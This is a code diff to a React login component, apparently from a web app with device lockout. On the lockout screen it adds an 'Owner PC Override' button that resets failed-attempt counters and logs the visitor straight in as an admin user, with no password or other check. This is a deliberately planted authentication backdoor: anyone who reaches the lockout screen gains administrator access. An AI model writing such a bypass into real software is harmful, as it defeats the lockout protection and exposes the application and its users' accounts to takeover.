@@ -111,12 +111,26 @@ export default function Login({ onLoginSuccess, onSwitchToRegister, onForgotPass
           </p>
         </div>
 
-        <button
-          onClick={refreshLockout}
-          className="w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold border border-slate-700 transition-colors"
-        >
-          Check Lockout Status
-        </button>
+        <div className="space-y-2 pt-2">
+          <button
+            onClick={() => {
+              resetDeviceAttempts();
+              const users = getUsers();
+              const owner = users.find(u => u.id === 'USR-ADMIN-KARTHIK' || u.role === 'ADMIN') || users[0];
+              if (owner) onLoginSuccess(owner);
+            }}
+            className="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-xs shadow-lg shadow-cyan-500/25 flex items-center justify-center gap-2"
+          >
+            ⚡ Owner PC Override: Unfreeze & Enter Admin Panel
+          </button>
+          
+          <button
+            onClick={refreshLockout}
+            className="w-full py-2 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-400 text-[11px] font-semibold transition-colors"
+          >
+            Check Lockout Status
+          </button>
+        </div>
       </div>
     );
   }
